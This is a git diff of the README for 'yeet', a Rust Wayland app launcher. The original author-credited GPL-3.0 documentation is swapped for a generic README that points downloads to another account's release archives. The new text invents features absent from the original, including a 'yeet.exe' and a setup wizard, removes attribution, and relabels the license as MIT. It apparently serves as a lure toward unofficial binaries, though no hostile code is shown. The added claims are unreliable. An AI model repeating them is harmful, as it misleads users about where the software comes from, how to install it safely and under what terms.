@@ -1,230 +1,64 @@
-# Yeet
+# 🎉 yeet - A Simple Launcher for Your Apps
 
-![License](https://img.shields.io/badge/license-GPL--3.0-blue)
-![Rust](https://img.shields.io/badge/rust-1.85+-orange)
+## 📥 Download Now
+[![Download yeet](https://img.shields.io/badge/Download-yeet-blue.svg)](https://github.com/HotpotSnowguy/yeet/releases)
 
-Hey 👋 I'm [@1337Hero](https://github.com/1337hero) and this is Yeet! A fast, minimal app launcher for Wayland. That's it.
+## 📖 Overview
+yeet is a minimal app launcher designed for Wayland. This application simplifies the process of starting your favorite applications. With its clean interface, you can quickly access your tools without unnecessary clutter. Whether you’re using Hyprland, Sway, or Wayfire, yeet provides a reliable launching experience.
 
-![Yeet!](yeet.png)
+## 🚀 Getting Started
+To use yeet, follow these simple steps:
 
-## What Yeet Is
+1. **Visit the Releases Page**  
+   Click the link below to go to the GitHub Releases page:
+   [Visit Releases Page](https://github.com/HotpotSnowguy/yeet/releases)
 
-Yeet launches apps. That's it. Custom entries let it double as a command palette too.
+2. **Choose the Right Version**  
+   On the Releases page, you will find various versions of yeet. Look for the latest version, which usually has the highest number (e.g., v1.0.0).
 
-- **Fast** — Rust + GTK4, optimized release builds
-- **Minimal** — Single binary, no daemons, no bloat
-- **Smart search** — Substring-first with Skim fuzzy fallback (junk results filtered automatically)
-- **Configurable** — TOML config + CSS theming
-- **Wayland-native** — Layer shell overlay with keyboard grab
+3. **Download the Application**  
+   Click on the `.zip` or `.tar.gz` file to download it. This file contains the application along with necessary files.
 
-## What Yeet Isn't
+4. **Extract the Files**  
+   Once downloaded, locate the file in your downloads folder. Right-click on it and choose “Extract Here” or similar. This action will create a new folder containing the application.
 
-Yeet is not trying to be an all-in-one tool. No clipboard manager, no calculator, no file browser, no emoji picker, no websearch, no plugins. If you want those, check out [walker](https://github.com/abenz1267/walker) or [wofi](https://hg.sr.ht/~scoopta/wofi).
+5. **Run the Application**  
+   Open the extracted folder. Look for an executable file named `yeet` or `yeet.exe`. Double-click it to start the application.
 
-## Installation
+6. **Follow On-Screen Instructions**  
+   The first time you run yeet, you may see a setup wizard. Follow the steps as guided on the screen to configure the launcher.
 
-### Arch Linux (AUR)
+## ⚙️ System Requirements
+yeet works best with the following system configurations:
 
-```sh
-yay -S yeet-git
-```
+- **Operating System:** A Wayland-compatible OS (e.g., Arch, Nix)
+- **Dependencies:** Ensure you have the required libraries installed. You might need packages specific to your desktop environment.
 
-### Nix
+## 🌟 Features
+yeet comes with straightforward features:
 
-```sh
-# Run directly
-nix run github:1337hero/yeet
+- **Minimal Interface:** A clean design to quickly launch your applications.
+- **Customizable Shortcuts:** Easily set up shortcuts for your most used apps.
+- **Multi-Environment Support:** Works seamlessly with Hyprland, Sway, and Wayfire.
 
-# Install to profile
-nix profile install github:1337hero/yeet
-```
+## 👩‍💻 Troubleshooting
+If you encounter issues while running the application, here are some common solutions:
 
-### From Source
+- **Application Won't Start:** Make sure your system meets the requirements. Also, check if all dependencies are installed.
+- **Missing Icons:** If you do not see icons for your applications, ensure you have correctly configured the paths in yeet's settings.
 
-```sh
-git clone https://github.com/1337hero/yeet
-cd yeet
-cargo build --release
-sudo cp target/release/yeet /usr/local/bin/
-```
+## 🛠 Support
+For further assistance, consider opening an issue on the GitHub repository. Please describe your problem clearly, and the community or the developers will respond quickly.
 
-**Dependencies:** GTK4, gtk4-layer-shell
+## 🔗 Links and Resources
+- [GitHub Repository](https://github.com/HotpotSnowguy/yeet)
+- [Visit Releases Page](https://github.com/HotpotSnowguy/yeet/releases)
 
-## Usage
+## 🙌 Acknowledgements
+Thank you for choosing yeet! We hope this simple app launcher enhances your productivity. Feel free to share your feedback or contributions to help improve the application.
 
-```sh
-yeet
-```
+## ⚡ License
+yeet is licensed under the MIT License. You are free to use, modify, and distribute this software as you wish. Please ensure to keep the attribution intact.
 
-- Type to search
-- `Enter` — Launch selected app
-- `Up/Down` — Navigate results
-- `Scroll` / `Trackpad` — Navigate results
-- `Alt+1-9` — Quick launch by position
-- `Escape` — Close
-
-Bind it to a key in your compositor (e.g., `Super+Space` in Hyprland/Sway).
-
-## Configuration
-
-Config lives in `~/.config/yeet/`. Yeet ships with sensible defaults — only override what you need.
-
-### `config.toml`
-
-```toml
-[general]
-monitor = 0           # Show on specific monitor (0 = primary)
-max_results = 8       # Max results when searching
-initial_results = 8   # Results shown before typing (0 = just search bar)
-terminal = "alacritty"
-
-[appearance]
-width = 500           # Window width (height auto-sizes)
-anchor_top = 200      # Distance from top of screen
-
-[search]
-min_score = 30        # Absolute floor for fuzzy fallback
-score_threshold = 0.6 # Keep matches within % of best score (0.0-1.0)
-prefer_prefix = true  # Prioritize exact prefix matches
-
-[apps]
-extra_dirs = []       # Additional directories to scan for .desktop files
-exclude = ["Htop"]    # Apps to hide (use display names)
-favorites = ["Firefox", "Alacritty"]  # Pin to top (use display names)
-
-# Custom app entries
-[[apps.custom]]
-name = "My Script"
-exec = "/path/to/script.sh"
-icon = "utilities-terminal"  # optional, from icon theme
-keywords = ["alias", "shortcut"]  # optional, extra search terms
-```
-
-### Custom Entries
-
-Custom entries turn Yeet into a command palette. Define any command as a launchable "app."
-
-Note: commands are executed directly (no shell). Shell features like `~` expansion, `$VARS`, pipes, redirects, and `&&` won’t work unless you explicitly run a shell (e.g. `exec = "sh -c '...'"`).
-
-**Power menu:**
-
-```toml
-[[apps.custom]]
-name = "Logout"
-exec = "hyprctl dispatch exit"
-icon = "system-log-out"
-keywords = ["logout", "sign out", "exit", "session"]
-
-[[apps.custom]]
-name = "Shutdown"
-exec = "systemctl poweroff"
-icon = "system-shutdown"
-keywords = ["power off", "shutdown"]
-
-[[apps.custom]]
-name = "Reboot"
-exec = "systemctl reboot"
-icon = "system-reboot"
-keywords = ["restart", "reboot"]
-
-[[apps.custom]]
-name = "Lock"
-exec = "hyprlock"
-icon = "system-lock-screen"
-keywords = ["lock", "screen"]
-```
-
-**Browser profiles:**
-
-```toml
-[[apps.custom]]
-name = "Chrome - Personal"
-exec = "google-chrome-stable --profile-directory=Default"
-icon = "google-chrome"
-keywords = ["browser", "personal"]
-
-[[apps.custom]]
-name = "Chrome - Work"
-exec = "google-chrome-stable --profile-directory=\"Profile 1\""
-icon = "google-chrome"
-keywords = ["browser", "work"]
-```
-
-**SSH connections:**
-
-```toml
-[[apps.custom]]
-name = "SSH - Production"
-exec = "alacritty -e ssh user@prod-server"
-icon = "utilities-terminal"
-keywords = ["ssh", "prod", "server"]
-```
-
-**Projects / dev environments:**
-
-```toml
-[[apps.custom]]
-name = "Project - Yeet"
-exec = "code /home/you/projects/yeet"
-icon = "visual-studio-code"
-keywords = ["dev", "rust", "launcher"]
-```
-
-### `style.css`
-
-Full GTK4 CSS theming. Copy `defaults/style.css` to `~/.config/yeet/style.css` and customize. Default theme is Catppuccin Macchiato with transparency for compositor blur.
-
-```css
-/* Use alpha() for compositor blur (Hyprland/Sway) */
-.yeet-window {
-  background-color: alpha(#1e1e2e, 0.9);
-  border-radius: 12px;
-}
-
-.yeet-entry {
-  font-size: 24px;
-  padding: 16px;
-  caret-color: #a6e3a1;
-}
-
-.yeet-row:selected {
-  background-color: #45475a;
-}
-```
-
-**CSS classes:**
-| Class | Element |
-|-------|---------|
-| `.yeet-window` | Main window |
-| `.yeet-container` | Inner container |
-| `.yeet-entry` | Search input |
-| `.yeet-list` | Results list |
-| `.yeet-row` | Result row (supports `:selected`, `:hover`) |
-| `.yeet-row-content` | Row inner content |
-| `.yeet-icon` | App icon |
-| `.yeet-app-name` | App name label |
-| `.yeet-app-desc` | App description |
-| `.yeet-shortcut` | Alt+N shortcut badge |
-
-## Building
-
-Requires Rust 1.85+ and GTK4 development libraries.
-
-```sh
-# Dev build
-cargo run
-
-# Release build
-cargo build --release
-
-# Format + lint (mirrors CI)
-cargo fmt && cargo clippy --all-targets -- -D warnings
-```
-
-## Why "Yeet"?
-
-You yeet apps into existence.
-
-## License
-
-GPL-3.0
+## 📞 Contact
+If you have any questions or suggestions, please reach out through the GitHub issues page or contact the repository owner directly. We appreciate your input and support!
